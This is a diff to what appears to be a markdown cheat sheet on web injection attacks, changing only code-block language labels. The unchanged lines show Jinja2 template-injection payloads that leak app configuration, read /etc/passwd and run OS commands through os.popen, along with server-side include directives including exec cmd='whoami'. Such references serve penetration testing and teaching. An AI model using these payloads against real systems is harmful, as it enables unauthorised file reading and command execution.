@@ -87,25 +87,25 @@ We follow the green arrow and inject the payload `{{7*'7'}}`. The result will e
 #### Information disclosure
 
 Obtain web application configuration
-```jinja2
+```jinja
 {{ config.items() }}
 ```
 
 Dump all available built-in functions
-```jinja2
+```jinja
 {{ self.__init__.__globals__.__builtins__ }}
 ```
 
 #### LFI
 
 We can use Python's built-in function `open` to include a local file. However, we cannot call the function directly; we need to call it from the `__builtins__` dictionary we dumped earlier
-```jinja2
+```jinja
 {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
 ```
 
 #### RCE
 
-```jinja2
+```jinja
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 ```
 
@@ -156,27 +156,27 @@ Example
 ```
 
 Prints environment variables
-```ssi
+```html
 <!--#printenv -->
 ```
 
 Prints config
-```ssi
+```html
 <!--#config errmsg="Error!" -->
 ```
 
 echo
-```ssi
+```html
 <!--#echo var="DOCUMENT_NAME" var="DOCUMENT_URI" var="DATE_LOCAL" -->
 ```
 
 exec
-```ssi
+```html
 <!--#exec cmd="whoami" -->
 ```
 
 include (only allows for the inclusion of files in the web root directory)
-```ssi
+```html
 <!--#include virtual="index.html" -->
 ```
 
